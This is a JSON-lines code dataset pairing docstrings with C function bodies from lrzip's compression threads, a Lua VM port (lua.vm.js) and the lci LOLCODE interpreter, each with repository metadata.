{"docstring": "/*\n  ***** COMPRESSION FUNCTIONS *****\n\n  ZPAQ, BZIP, GZIP, LZMA, LZO\n\n  try to compress a buffer. If compression fails for whatever reason then\n  leave uncompressed. Return the compression type in c_type and resulting\n  length in c_len\n*/\n", "func_signal": "static int zpaq_compress_buf(rzip_control *control, struct compress_thread *cthread, long thread)", "code": "{\n\ti64 c_len, c_size;\n\tuchar *c_buf;\n\n\tif (!lzo_compresses(control, cthread->s_buf, cthread->s_len))\n\t\treturn 0;\n\n\tc_size = round_up_page(control, cthread->s_len + 10000);\n\tc_buf = malloc(c_size);\n\tif (!c_buf) {\n\t\tprint_err(\"Unable to allocate c_buf in zpaq_compress_buf\\n\");\n\t\treturn -1;\n\t}\n\n\tc_len = 0;\n\n\tzpaq_compress(c_buf, &c_len, cthread->s_buf, cthread->s_len, control->compression_level / 4 + 1,\n\t\t      control->msgout, SHOW_PROGRESS ? true: false, thread);\n\n\tif (unlikely(c_len >= cthread->c_len)) {\n\t\tprint_maxverbose(\"Incompressible block\\n\");\n\t\t/* Incompressible, leave as CTYPE_NONE */\n\t\tdealloc(c_buf);\n\t\treturn 0;\n\t}\n\n\tcthread->c_len = c_len;\n\tdealloc(cthread->s_buf);\n\tcthread->s_buf = c_buf;\n\tcthread->c_type = CTYPE_ZPAQ;\n\treturn 0;\n}", "path": "lrzip/stream.c", "commit_date": "2019-12-03 00:00:00", "repo_name": "ckolivas/lrzip", "stars": 567, "license": "gpl-2.0", "language": "c", "size": 2396}
{"docstring": "/* Enter with s_buf allocated,s_buf points to the compressed data after the\n * backend compression and is then freed here */\n", "func_signal": "static void *compthread(void *data)", "code": "{\n\tstream_thread_struct *s = data;\n\trzip_control *control = s->control;\n\tlong i = s->i;\n\tstruct compress_thread *cti;\n\tstruct stream_info *ctis;\n\tint waited = 0, ret = 0;\n\ti64 padded_len;\n\tint write_len;\n\n\t/* Make sure this thread doesn't already exist */\n\n\tdealloc(data);\n\tcti = &cthread[i];\n\tctis = cti->sinfo;\n\n\tif (unlikely(setpriority(PRIO_PROCESS, 0, control->nice_val) == -1)) {\n\t\tprint_err(\"Warning, unable to set thread nice value %d...Resetting to %d\\n\", control->nice_val, control->current_priority);\n\t\tsetpriority(PRIO_PROCESS, 0, (control->nice_val=control->current_priority));\n\t}\n\tcti->c_type = CTYPE_NONE;\n\tcti->c_len = cti->s_len;\n\n\t/* Flushing writes to disk frees up any dirty ram, improving chances\n\t * of succeeding in allocating more ram */\n\tfsync(ctis->fd);\nretry:\n\t/* Very small buffers have issues to do with minimum amounts of ram\n\t * allocatable to a buffer combined with the MINIMUM_MATCH of rzip\n\t * being 31 bytes so don't bother trying to compress anything less\n\t * than 64 bytes. */\n\tif (!NO_COMPRESS && cti->c_len >= 64) {\n\t\tif (LZMA_COMPRESS)\n\t\t\tret = lzma_compress_buf(control, cti);\n\t\telse if (LZO_COMPRESS)\n\t\t\tret = lzo_compress_buf(control, cti);\n\t\telse if (BZIP2_COMPRESS)\n\t\t\tret = bzip2_compress_buf(control, cti);\n\t\telse if (ZLIB_COMPRESS)\n\t\t\tret = gzip_compress_buf(control, cti);\n\t\telse if (ZPAQ_COMPRESS)\n\t\t\tret = zpaq_compress_buf(control, cti, i);\n\t\telse failure_goto((\"Dunno wtf compression to use!\\n\"), error);\n\t}\n\n\tpadded_len = cti->c_len;\n\tif (!ret && padded_len < MIN_SIZE) {\n\t\t/* We need to pad out each block to at least be CBC_LEN bytes\n\t\t * long or encryption cannot work. We pad it with random\n\t\t * data */\n\t\tpadded_len = MIN_SIZE;\n\t\tcti->s_buf = realloc(cti->s_buf, MIN_SIZE);\n\t\tif (unlikely(!cti->s_buf))\n\t\t\tfatal_goto((\"Failed to realloc s_buf in compthread\\n\"), error);\n\t\tif (unlikely(!get_rand(control, cti->s_buf + cti->c_len, MIN_SIZE - cti->c_len)))\n\t\t\tgoto error;\n\t}\n\n\t/* If compression fails for whatever reason multithreaded, then wait\n\t * for the previous thread to finish, serialising the work to decrease\n\t * the memory requirements, increasing the chance of success */\n\tif (unlikely(ret && waited))\n\t\tfailure_goto((\"Failed to compress in compthread\\n\"), error);\n\n\tif (!waited) {\n\t\tlock_mutex(control, &output_lock);\n\t\twhile (output_thread != i)\n\t\t\tcond_wait(control, &output_cond, &output_lock);\n\t\tunlock_mutex(control, &output_lock);\n\t\twaited = 1;\n\t}\n\tif (unlikely(ret)) {\n\t\tprint_maxverbose(\"Unable to compress in parallel, waiting for previous thread to complete before trying again\\n\");\n\t\tgoto retry;\n\t}\n\n\t/* Need to be big enough to fill one CBC_LEN */\n\tif (ENCRYPT)\n\t\twrite_len = 8;\n\telse\n\t\twrite_len = ctis->chunk_bytes;\n\n\tif (!ctis->chunks++) {\n\t\tint j;\n\n\t\tif (TMP_OUTBUF) {\n\t\t\tlock_mutex(control, &control->control_lock);\n\t\t\tif (!control->magic_written)\n\t\t\t\twrite_magic(control);\n\t\t\tunlock_mutex(control, &control->control_lock);\n\n\t\t\tif (unlikely(!flush_tmpoutbuf(control))) {\n\t\t\t\tprint_err(\"Failed to flush_tmpoutbuf in compthread\\n\");\n\t\t\t\tgoto error;\n\t\t\t}\n\t\t}\n\n\t\tprint_maxverbose(\"Writing initial chunk bytes value %d at %lld\\n\",\n\t\t\t\t ctis->chunk_bytes, get_seek(control, ctis->fd));\n\t\t/* Write chunk bytes of this block */\n\t\twrite_u8(control, ctis->chunk_bytes);\n\n\t\t/* Write whether this is the last chunk, followed by the size\n\t\t * of this chunk */\n\t\tprint_maxverbose(\"Writing EOF flag as %d\\n\", control->eof);\n\t\twrite_u8(control, control->eof);\n\t\tif (!ENCRYPT)\n\t\t\twrite_val(control, ctis->size, ctis->chunk_bytes);\n\n\t\t/* First chunk of this stream, write headers */\n\t\tctis->initial_pos = get_seek(control, ctis->fd);\n\t\tif (unlikely(ctis->initial_pos == -1))\n\t\t\tgoto error;\n\n\t\tprint_maxverbose(\"Writing initial header at %lld\\n\", ctis->initial_pos);\n\t\tfor (j = 0; j < ctis->num_streams; j++) {\n\t\t\t/* If encrypting, we leave SALT_LEN room to write in salt\n\t\t\t* later */\n\t\t\tif (ENCRYPT) {\n\t\t\t\tif (unlikely(write_val(control, 0, SALT_LEN)))\n\t\t\t\t\tfatal_goto((\"Failed to write_buf blank salt in compthread %d\\n\", i), error);\n\t\t\t\tctis->cur_pos += SALT_LEN;\n\t\t\t}\n\t\t\tctis->s[j].last_head = ctis->cur_pos + 1 + (write_len * 2);\n\t\t\twrite_u8(control, CTYPE_NONE);\n\t\t\twrite_val(control, 0, write_len);\n\t\t\twrite_val(control, 0, write_len);\n\t\t\twrite_val(control, 0, write_len);\n\t\t\tctis->cur_pos += 1 + (write_len * 3);\n\t\t}\n\t}\n\n\tprint_maxverbose(\"Compthread %ld seeking to %lld to store length %d\\n\", i, ctis->s[cti->streamno].last_head, write_len);\n\n\tif (unlikely(seekto(control, ctis, ctis->s[cti->streamno].last_head)))\n\t\tfatal_goto((\"Failed to seekto in compthread %d\\n\", i), error);\n\n\tif (unlikely(write_val(control, ctis->cur_pos, write_len)))\n\t\tfatal_goto((\"Failed to write_val cur_pos in compthread %d\\n\", i), error);\n\n\tif (ENCRYPT)\n\t\trewrite_encrypted(control, ctis, ctis->s[cti->streamno].last_head - 17);\n\n\tctis->s[cti->streamno].last_head = ctis->cur_pos + 1 + (write_len * 2) + (ENCRYPT ? SALT_LEN : 0);\n\n\tprint_maxverbose(\"Compthread %ld seeking to %lld to write header\\n\", i, ctis->cur_pos);\n\n\tif (unlikely(seekto(control, ctis, ctis->cur_pos)))\n\t\tfatal_goto((\"Failed to seekto cur_pos in compthread %d\\n\", i), error);\n\n\tprint_maxverbose(\"Thread %ld writing %lld compressed bytes from stream %d\\n\", i, padded_len, cti->streamno);\n\n\tif (ENCRYPT) {\n\t\tif (unlikely(write_val(control, 0, SALT_LEN)))\n\t\t\tfatal_goto((\"Failed to write_buf header salt in compthread %d\\n\", i), error);\n\t\tctis->cur_pos += SALT_LEN;\n\t\tctis->s[cti->streamno].last_headofs = ctis->cur_pos;\n\t}\n\t/* We store the actual c_len even though we might pad it out */\n\tif (unlikely(write_u8(control, cti->c_type) ||\n\t\twrite_val(control, cti->c_len, write_len) ||\n\t\twrite_val(control, cti->s_len, write_len) ||\n\t\twrite_val(control, 0, write_len))) {\n\t\t\tfatal_goto((\"Failed write in compthread %d\\n\", i), error);\n\t}\n\tctis->cur_pos += 1 + (write_len * 3);\n\n\tif (ENCRYPT) {\n\t\tif (unlikely(!get_rand(control, cti->salt, SALT_LEN)))\n\t\t\tgoto error;\n\t\tif (unlikely(write_buf(control, cti->salt, SALT_LEN)))\n\t\t\tfatal_goto((\"Failed to write_buf block salt in compthread %d\\n\", i), error);\n\t\tif (unlikely(!lrz_encrypt(control, cti->s_buf, padded_len, cti->salt)))\n\t\t\tgoto error;\n\t\tctis->cur_pos += SALT_LEN;\n\t}\n\n\tprint_maxverbose(\"Compthread %ld writing data at %lld\\n\", i, ctis->cur_pos);\n\n\tif (unlikely(write_buf(control, cti->s_buf, padded_len)))\n\t\tfatal_goto((\"Failed to write_buf s_buf in compthread %d\\n\", i), error);\n\n\tctis->cur_pos += padded_len;\n\tdealloc(cti->s_buf);\n\n\tlock_mutex(control, &output_lock);\n\tif (++output_thread == control->threads)\n\t\toutput_thread = 0;\n\tcond_broadcast(control, &output_cond);\n\tunlock_mutex(control, &output_lock);\n\nerror:\n\tcksem_post(control, &cti->cksem);\n\n\treturn NULL;\n}", "path": "lrzip/stream.c", "commit_date": "2019-12-03 00:00:00", "repo_name": "ckolivas/lrzip", "stars": 567, "license": "gpl-2.0", "language": "c", "size": 2396}
{"docstring": "/*\n** function to close regular files\n*/\n", "func_signal": "static int io_fclose (lua_State *L)", "code": "{\n  LStream *p = tolstream(L);\n  int res = fclose(p->f);\n  return luaL_fileresult(L, (res == 0), NULL);\n}", "path": "lua.vm.js/lua/src/liolib.c", "commit_date": "2014-05-10 00:00:00", "repo_name": "daurnimator/lua.vm.js", "stars": 834, "license": "mit", "language": "c", "size": 4534}
{"docstring": "/*\n** preinitialize a state with consistent values without allocating\n** any memory (to avoid errors)\n*/\n", "func_signal": "static void preinit_state (lua_State *L, global_State *g)", "code": "{\n  G(L) = g;\n  L->stack = NULL;\n  L->ci = NULL;\n  L->stacksize = 0;\n  L->errorJmp = NULL;\n  L->nCcalls = 0;\n  L->hook = NULL;\n  L->hookmask = 0;\n  L->basehookcount = 0;\n  L->allowhook = 1;\n  resethookcount(L);\n  L->openupval = NULL;\n  L->nny = 1;\n  L->status = LUA_OK;\n  L->errfunc = 0;\n}", "path": "lua.vm.js/lua/src/lstate.c", "commit_date": "2014-05-10 00:00:00", "repo_name": "daurnimator/lua.vm.js", "stars": 834, "license": "mit", "language": "c", "size": 4534}
{"docstring": "/*\n** load precompiled chunk\n*/\n", "func_signal": "Closure* luaU_undump (lua_State* L, ZIO* Z, Mbuffer* buff, const char* name)", "code": "{\n LoadState S;\n Closure* cl;\n if (*name=='@' || *name=='=')\n  S.name=name+1;\n else if (*name==LUA_SIGNATURE[0])\n  S.name=\"binary string\";\n else\n  S.name=name;\n S.L=L;\n S.Z=Z;\n S.b=buff;\n LoadHeader(&S);\n cl=luaF_newLclosure(L,1);\n setclLvalue(L,L->top,cl); incr_top(L);\n cl->l.p=luaF_newproto(L);\n LoadFunction(&S,cl->l.p);\n if (cl->l.p->sizeupvalues != 1)\n {\n  Proto* p=cl->l.p;\n  cl=luaF_newLclosure(L,cl->l.p->sizeupvalues);\n  cl->l.p=p;\n  setclLvalue(L,L->top-1,cl);\n }\n luai_verifycode(L,buff,cl->l.p);\n return cl;\n}", "path": "lua.vm.js/lua/src/lundump.c", "commit_date": "2014-05-10 00:00:00", "repo_name": "daurnimator/lua.vm.js", "stars": 834, "license": "mit", "language": "c", "size": 4534}
{"docstring": "/*\n** Open math library\n*/\n", "func_signal": "LUAMOD_API int luaopen_math (lua_State *L)", "code": "{\n  luaL_newlib(L, mathlib);\n  lua_pushnumber(L, PI);\n  lua_setfield(L, -2, \"pi\");\n  lua_pushnumber(L, HUGE_VAL);\n  lua_setfield(L, -2, \"huge\");\n  return 1;\n}", "path": "lua.vm.js/lua/src/lmathlib.c", "commit_date": "2014-05-10 00:00:00", "repo_name": "daurnimator/lua.vm.js", "stars": 834, "license": "mit", "language": "c", "size": 4534}
{"docstring": "/*\n** finish execution of an opcode interrupted by an yield\n*/\n", "func_signal": "void luaV_finishOp (lua_State *L)", "code": "{\n  CallInfo *ci = L->ci;\n  StkId base = ci->u.l.base;\n  Instruction inst = *(ci->u.l.savedpc - 1);  /* interrupted instruction */\n  OpCode op = GET_OPCODE(inst);\n  switch (op) {  /* finish its execution */\n    case OP_ADD: case OP_SUB: case OP_MUL: case OP_DIV:\n    case OP_MOD: case OP_POW: case OP_UNM: case OP_LEN:\n    case OP_GETTABUP: case OP_GETTABLE: case OP_SELF: {\n      setobjs2s(L, base + GETARG_A(inst), --L->top);\n      break;\n    }\n    case OP_LE: case OP_LT: case OP_EQ: {\n      int res = !l_isfalse(L->top - 1);\n      L->top--;\n      /* metamethod should not be called when operand is K */\n      lua_assert(!ISK(GETARG_B(inst)));\n      if (op == OP_LE &&  /* \"<=\" using \"<\" instead? */\n          ttisnil(luaT_gettmbyobj(L, base + GETARG_B(inst), TM_LE)))\n        res = !res;  /* invert result */\n      lua_assert(GET_OPCODE(*ci->u.l.savedpc) == OP_JMP);\n      if (res != GETARG_A(inst))  /* condition failed? */\n        ci->u.l.savedpc++;  /* skip jump instruction */\n      break;\n    }\n    case OP_CONCAT: {\n      StkId top = L->top - 1;  /* top when 'call_binTM' was called */\n      int b = GETARG_B(inst);      /* first element to concatenate */\n      int total = cast_int(top - 1 - (base + b));  /* yet to concatenate */\n      setobj2s(L, top - 2, top);  /* put TM result in proper position */\n      if (total > 1) {  /* are there elements to concat? */\n        L->top = top - 1;  /* top is one after last element (at top-2) */\n        luaV_concat(L, total);  /* concat them (may yield again) */\n      }\n      /* move final result to final position */\n      setobj2s(L, ci->u.l.base + GETARG_A(inst), L->top - 1);\n      L->top = ci->top;  /* restore top */\n      break;\n    }\n    case OP_TFORCALL: {\n      lua_assert(GET_OPCODE(*ci->u.l.savedpc) == OP_TFORLOOP);\n      L->top = ci->top;  /* correct top */\n      break;\n    }\n    case OP_CALL: {\n      if (GETARG_C(inst) - 1 >= 0)  /* nresults >= 0? */\n        L->top = ci->top;  /* adjust results */\n      break;\n    }\n    case OP_TAILCALL: case OP_SETTABUP: case OP_SETTABLE:\n      break;\n    default: lua_assert(0);\n  }\n}", "path": "lua.vm.js/lua/src/lvm.c", "commit_date": "2014-05-10 00:00:00", "repo_name": "daurnimator/lua.vm.js", "stars": 834, "license": "mit", "language": "c", "size": 4534}
{"docstring": "/*\n** returns current `pc' and marks it as a jump target (to avoid wrong\n** optimizations with consecutive instructions not in the same basic block).\n*/\n", "func_signal": "int luaK_getlabel (FuncState *fs)", "code": "{\n  fs->lasttarget = fs->pc;\n  return fs->pc;\n}", "path": "lua.vm.js/lua/src/lcode.c", "commit_date": "2014-05-10 00:00:00", "repo_name": "daurnimator/lua.vm.js", "stars": 834, "license": "mit", "language": "c", "size": 4534}
{"docstring": "/*\n** create a new Lua closure, push it in the stack, and initialize\n** its upvalues. Note that the call to 'luaC_barrierproto' must come\n** before the assignment to 'p->cache', as the function needs the\n** original value of that field.\n*/\n", "func_signal": "static void pushclosure (lua_State *L, Proto *p, UpVal **encup, StkId base,\n                         StkId ra)", "code": "{\n  int nup = p->sizeupvalues;\n  Upvaldesc *uv = p->upvalues;\n  int i;\n  Closure *ncl = luaF_newLclosure(L, nup);\n  ncl->l.p = p;\n  setclLvalue(L, ra, ncl);  /* anchor new closure in stack */\n  for (i = 0; i < nup; i++) {  /* fill in its upvalues */\n    if (uv[i].instack)  /* upvalue refers to local variable? */\n      ncl->l.upvals[i] = luaF_findupval(L, base + uv[i].idx);\n    else  /* get upvalue from enclosing function */\n      ncl->l.upvals[i] = encup[uv[i].idx];\n  }\n  luaC_barrierproto(L, p, ncl);\n  p->cache = ncl;  /* save it on cache for reuse */\n}", "path": "lua.vm.js/lua/src/lvm.c", "commit_date": "2014-05-10 00:00:00", "repo_name": "daurnimator/lua.vm.js", "stars": 834, "license": "mit", "language": "c", "size": 4534}
{"docstring": "/*\n** function to be used with macro \"fasttm\": optimized for absence of\n** tag methods\n*/\n", "func_signal": "const TValue *luaT_gettm (Table *events, TMS event, TString *ename)", "code": "{\n  const TValue *tm = luaH_getstr(events, ename);\n  lua_assert(event <= TM_EQ);\n  if (ttisnil(tm)) {  /* no tag method? */\n    events->flags |= cast_byte(1u<<event);  /* cache this fact */\n    return NULL;\n  }\n  else return tm;\n}", "path": "lua.vm.js/lua/src/ltm.c", "commit_date": "2014-05-10 00:00:00", "repo_name": "daurnimator/lua.vm.js", "stars": 834, "license": "mit", "language": "c", "size": 4534}
{"docstring": "/*\n** check whether cached closure in prototype 'p' may be reused, that is,\n** whether there is a cached closure with the same upvalues needed by\n** new closure to be created.\n*/\n", "func_signal": "static Closure *getcached (Proto *p, UpVal **encup, StkId base)", "code": "{\n  Closure *c = p->cache;\n  if (c != NULL) {  /* is there a cached closure? */\n    int nup = p->sizeupvalues;\n    Upvaldesc *uv = p->upvalues;\n    int i;\n    for (i = 0; i < nup; i++) {  /* check whether it has right upvalues */\n      TValue *v = uv[i].instack ? base + uv[i].idx : encup[uv[i].idx]->v;\n      if (c->l.upvals[i]->v != v)\n        return NULL;  /* wrong upvalue; cannot reuse closure */\n    }\n  }\n  return c;  /* return cached closure (or NULL if no cached closure) */\n}", "path": "lua.vm.js/lua/src/lvm.c", "commit_date": "2014-05-10 00:00:00", "repo_name": "daurnimator/lua.vm.js", "stars": 834, "license": "mit", "language": "c", "size": 4534}
{"docstring": "/*\n* make header for precompiled chunks\n* if you change the code below be sure to update LoadHeader and FORMAT above\n* and LUAC_HEADERSIZE in lundump.h\n*/\n", "func_signal": "void luaU_header (lu_byte* h)", "code": "{\n int x=1;\n memcpy(h,LUA_SIGNATURE,sizeof(LUA_SIGNATURE)-sizeof(char));\n h+=sizeof(LUA_SIGNATURE)-sizeof(char);\n *h++=cast_byte(VERSION);\n *h++=cast_byte(FORMAT);\n *h++=cast_byte(*(char*)&x);\t\t\t/* endianness */\n *h++=cast_byte(sizeof(int));\n *h++=cast_byte(sizeof(size_t));\n *h++=cast_byte(sizeof(Instruction));\n *h++=cast_byte(sizeof(lua_Number));\n *h++=cast_byte(((lua_Number)0.5)==0);\t\t/* is lua_Number integral? */\n memcpy(h,LUAC_TAIL,sizeof(LUAC_TAIL)-sizeof(char));\n}", "path": "lua.vm.js/lua/src/lundump.c", "commit_date": "2014-05-10 00:00:00", "repo_name": "daurnimator/lua.vm.js", "stars": 834, "license": "mit", "language": "c", "size": 4534}
{"docstring": "/*\n** function to close 'popen' files\n*/\n", "func_signal": "static int io_pclose (lua_State *L)", "code": "{\n  LStream *p = tolstream(L);\n  return luaL_execresult(L, lua_pclose(L, p->f));\n}", "path": "lua.vm.js/lua/src/liolib.c", "commit_date": "2014-05-10 00:00:00", "repo_name": "daurnimator/lua.vm.js", "stars": 834, "license": "mit", "language": "c", "size": 4534}
{"docstring": "/*\n** When creating file handles, always creates a `closed' file handle\n** before opening the actual file; so, if there is a memory error, the\n** file is not left opened.\n*/\n", "func_signal": "static LStream *newprefile (lua_State *L)", "code": "{\n  LStream *p = (LStream *)lua_newuserdata(L, sizeof(LStream));\n  p->closef = NULL;  /* mark file handle as 'closed' */\n  luaL_setmetatable(L, LUA_FILEHANDLE);\n  return p;\n}", "path": "lua.vm.js/lua/src/liolib.c", "commit_date": "2014-05-10 00:00:00", "repo_name": "daurnimator/lua.vm.js", "stars": 834, "license": "mit", "language": "c", "size": 4534}
{"docstring": "/*\n** check whether list has any jump that do not produce a value\n** (or produce an inverted value)\n*/\n", "func_signal": "static int need_value (FuncState *fs, int list)", "code": "{\n  for (; list != NO_JUMP; list = getjump(fs, list)) {\n    Instruction i = *getjumpcontrol(fs, list);\n    if (GET_OPCODE(i) != OP_TESTSET) return 1;\n  }\n  return 0;  /* not found */\n}", "path": "lua.vm.js/lua/src/lcode.c", "commit_date": "2014-05-10 00:00:00", "repo_name": "daurnimator/lua.vm.js", "stars": 834, "license": "mit", "language": "c", "size": 4534}
{"docstring": "/*\n** open parts of the state that may cause memory-allocation errors\n*/\n", "func_signal": "static void f_luaopen (lua_State *L, void *ud)", "code": "{\n  global_State *g = G(L);\n  UNUSED(ud);\n  stack_init(L, L);  /* init stack */\n  init_registry(L, g);\n  luaS_resize(L, MINSTRTABSIZE);  /* initial size of string table */\n  luaT_init(L);\n  luaX_init(L);\n  /* pre-create memory-error message */\n  g->memerrmsg = luaS_newliteral(L, MEMERRMSG);\n  luaS_fix(g->memerrmsg);  /* it should never be collected */\n  g->gcrunning = 1;  /* allow gc */\n  g->version = lua_version(NULL);\n  luai_userstateopen(L);\n}", "path": "lua.vm.js/lua/src/lstate.c", "commit_date": "2014-05-10 00:00:00", "repo_name": "daurnimator/lua.vm.js", "stars": 834, "license": "mit", "language": "c", "size": 4534}
{"docstring": "/*\n** function to (not) close the standard files stdin, stdout, and stderr\n*/\n", "func_signal": "static int io_noclose (lua_State *L)", "code": "{\n  LStream *p = tolstream(L);\n  p->closef = &io_noclose;  /* keep file opened */\n  lua_pushnil(L);\n  lua_pushliteral(L, \"cannot close standard file\");\n  return 2;\n}", "path": "lua.vm.js/lua/src/liolib.c", "commit_date": "2014-05-10 00:00:00", "repo_name": "daurnimator/lua.vm.js", "stars": 834, "license": "mit", "language": "c", "size": 4534}
{"docstring": "/*\n** Look for n-th local variable at line `line' in function `func'.\n** Returns NULL if not found.\n*/\n", "func_signal": "const char *luaF_getlocalname (const Proto *f, int local_number, int pc)", "code": "{\n  int i;\n  for (i = 0; i<f->sizelocvars && f->locvars[i].startpc <= pc; i++) {\n    if (pc < f->locvars[i].endpc) {  /* is variable active? */\n      local_number--;\n      if (local_number == 0)\n        return getstr(f->locvars[i].varname);\n    }\n  }\n  return NULL;  /* not found */\n}", "path": "lua.vm.js/lua/src/lfunc.c", "commit_date": "2014-05-10 00:00:00", "repo_name": "daurnimator/lua.vm.js", "stars": 834, "license": "mit", "language": "c", "size": 4534}
{"docstring": "/* --------------------------------------------------------------- read --- */\n", "func_signal": "size_t luaZ_read (ZIO *z, void *b, size_t n)", "code": "{\n  while (n) {\n    size_t m;\n    if (z->n == 0) {  /* no bytes in buffer? */\n      if (luaZ_fill(z) == EOZ)  /* try to read more */\n        return n;  /* no more input; return number of missing bytes */\n      else {\n        z->n++;  /* luaZ_fill consumed first byte; put it back */\n        z->p--;\n      }\n    }\n    m = (n <= z->n) ? n : z->n;  /* min. between n and z->n */\n    memcpy(b, z->p, m);\n    z->n -= m;\n    z->p += m;\n    b = (char *)b + m;\n    n -= m;\n  }\n  return 0;\n}", "path": "lua.vm.js/lua/src/lzio.c", "commit_date": "2014-05-10 00:00:00", "repo_name": "daurnimator/lua.vm.js", "stars": 834, "license": "mit", "language": "c", "size": 4534}
{"docstring": "/*\n** equality of Lua values. L == NULL means raw equality (no metamethods)\n*/\n", "func_signal": "int luaV_equalobj_ (lua_State *L, const TValue *t1, const TValue *t2)", "code": "{\n  const TValue *tm;\n  lua_assert(ttisequal(t1, t2));\n  switch (ttype(t1)) {\n    case LUA_TNIL: return 1;\n    case LUA_TNUMBER: return luai_numeq(nvalue(t1), nvalue(t2));\n    case LUA_TBOOLEAN: return bvalue(t1) == bvalue(t2);  /* true must be 1 !! */\n    case LUA_TLIGHTUSERDATA: return pvalue(t1) == pvalue(t2);\n    case LUA_TLCF: return fvalue(t1) == fvalue(t2);\n    case LUA_TSHRSTR: return eqshrstr(rawtsvalue(t1), rawtsvalue(t2));\n    case LUA_TLNGSTR: return luaS_eqlngstr(rawtsvalue(t1), rawtsvalue(t2));\n    case LUA_TUSERDATA: {\n      if (uvalue(t1) == uvalue(t2)) return 1;\n      else if (L == NULL) return 0;\n      tm = get_equalTM(L, uvalue(t1)->metatable, uvalue(t2)->metatable, TM_EQ);\n      break;  /* will try TM */\n    }\n    case LUA_TTABLE: {\n      if (hvalue(t1) == hvalue(t2)) return 1;\n      else if (L == NULL) return 0;\n      tm = get_equalTM(L, hvalue(t1)->metatable, hvalue(t2)->metatable, TM_EQ);\n      break;  /* will try TM */\n    }\n    default:\n      lua_assert(iscollectable(t1));\n      return gcvalue(t1) == gcvalue(t2);\n  }\n  if (tm == NULL) return 0;  /* no TM? */\n  callTM(L, tm, t1, t2, L->top, 1);  /* call TM */\n  return !l_isfalse(L->top);\n}", "path": "lua.vm.js/lua/src/lvm.c", "commit_date": "2014-05-10 00:00:00", "repo_name": "daurnimator/lua.vm.js", "stars": 834, "license": "mit", "language": "c", "size": 4534}
{"docstring": "/*\n** generic allocation routine.\n*/\n", "func_signal": "void *luaM_realloc_ (lua_State *L, void *block, size_t osize, size_t nsize)", "code": "{\n  void *newblock;\n  global_State *g = G(L);\n  size_t realosize = (block) ? osize : 0;\n  lua_assert((realosize == 0) == (block == NULL));\n#if defined(HARDMEMTESTS)\n  if (nsize > realosize && g->gcrunning)\n    luaC_fullgc(L, 1);  /* force a GC whenever possible */\n#endif\n  newblock = (*g->frealloc)(g->ud, block, osize, nsize);\n  if (newblock == NULL && nsize > 0) {\n    api_check(L, nsize > realosize,\n                 \"realloc cannot fail when shrinking a block\");\n    if (g->gcrunning) {\n      luaC_fullgc(L, 1);  /* try to free some memory... */\n      newblock = (*g->frealloc)(g->ud, block, osize, nsize);  /* try again */\n    }\n    if (newblock == NULL)\n      luaD_throw(L, LUA_ERRMEM);\n  }\n  lua_assert((nsize == 0) == (newblock == NULL));\n  g->GCdebt = (g->GCdebt + nsize) - realosize;\n  return newblock;\n}", "path": "lua.vm.js/lua/src/lmem.c", "commit_date": "2014-05-10 00:00:00", "repo_name": "daurnimator/lua.vm.js", "stars": 834, "license": "mit", "language": "c", "size": 4534}
{"docstring": "/*\n** Create registry table and its predefined values\n*/\n", "func_signal": "static void init_registry (lua_State *L, global_State *g)", "code": "{\n  TValue mt;\n  /* create registry */\n  Table *registry = luaH_new(L);\n  sethvalue(L, &g->l_registry, registry);\n  luaH_resize(L, registry, LUA_RIDX_LAST, 0);\n  /* registry[LUA_RIDX_MAINTHREAD] = L */\n  setthvalue(L, &mt, L);\n  luaH_setint(L, registry, LUA_RIDX_MAINTHREAD, &mt);\n  /* registry[LUA_RIDX_GLOBALS] = table of globals */\n  sethvalue(L, &mt, luaH_new(L));\n  luaH_setint(L, registry, LUA_RIDX_GLOBALS, &mt);\n}", "path": "lua.vm.js/lua/src/lstate.c", "commit_date": "2014-05-10 00:00:00", "repo_name": "daurnimator/lua.vm.js", "stars": 834, "license": "mit", "language": "c", "size": 4534}
{"docstring": "/**\n * Deletes a scope.\n *\n * \\param [in,out] scope The scope to delete.\n *\n * \\post The memory at \\a scope and any of its members will be freed.\n */\n", "func_signal": "void deleteScopeObject(ScopeObject *scope)", "code": "{\n\tunsigned int n;\n\tif (!scope) return;\n\tfor (n = 0; n < scope->numvals; n++) {\n\t\tfree(scope->names[n]);\n\t\tdeleteValueObject(scope->values[n]);\n\t}\n\tfree(scope->names);\n\tfree(scope->values);\n\tdeleteValueObject(scope->impvar);\n\tfree(scope);\n}", "path": "lci/interpreter.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "justinmeza/lci", "stars": 769, "license": "gpl-3.0", "language": "c", "size": 1153}
{"docstring": "/**\n * Gets a scope from within another scope.\n *\n * \\param [in] src The scope to evaluate \\a target under.\n *\n * \\param [in,out] dest The scope to update the value in.\n *\n * \\param [in] target The name of the scope to get.\n *\n * \\return The value in \\a dest, named by evaluating \\a target under \\a src,\n * without accessing any ancestors of \\a dest.\n *\n * \\retval NULL Either \\a target could not be evaluated in \\a src or \\a target\n * could not be found in \\a dest.\n */\n", "func_signal": "ScopeObject *getScopeObject(ScopeObject *src,\n                            ScopeObject *dest,\n                            IdentifierNode *target)", "code": "{\n\tValueObject *val = NULL;\n\tchar *name = NULL;\n\tint status;\n\tint isI;\n\tint isME;\n\tScopeObject *scope;\n\t\n\t/* Look up the identifier name */\n\tname = resolveIdentifierName(target, src);\n\tif (!name) goto getScopeObjectAbort;\n\n\t/* Check for targets with special meanings */\n\tisI = strcmp(name, \"I\");\n\tisME = strcmp(name, \"ME\");\n\tfree(name);\n\tname = NULL;\n\n\tif (!isI) {\n\t\t/* The function scope variable */\n\t\treturn src;\n\t}\n\telse if (!isME) {\n\t\t/* The calling object scope variable */\n\t\tscope = getScopeObjectLocal(src, dest, target);\n\t\tif (!scope) goto getScopeObjectAbort;\n\t\treturn scope;\n\t}\n\n\t/* Access any slots */\n\twhile (target->slot) {\n\t\t/*\n\t\t * Look up the target in the dest scope, using the src scope\n\t\t * for resolving variables in indirect identifiers\n\t\t */\n\t\tscope = getScopeObjectLocal(src, dest, target);\n\t\tif (!scope) goto getScopeObjectAbort;\n\t\tdest = scope;\n\n\t\ttarget = target->slot;\n\t}\n\n\tval = getScopeValue(src, dest, target);\n\tif (!val) goto getScopeObjectAbort;\n\tif (val->type != VT_ARRAY) {\n\t\tchar *name = resolveIdentifierName(target, src);\n\t\terror(IN_VARIABLE_NOT_AN_ARRAY, target->fname, target->line, name);\n\t\tfree(name);\n\t\tgoto getScopeObjectAbort;\n\t}\n\n\treturn getArray(val);\n\ngetScopeObjectAbort: /* In case something goes wrong... */\n\n\t/* Clean up any allocated structures */\n\tif (name) free(name);\n\n\treturn NULL;\n}", "path": "lci/interpreter.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "justinmeza/lci", 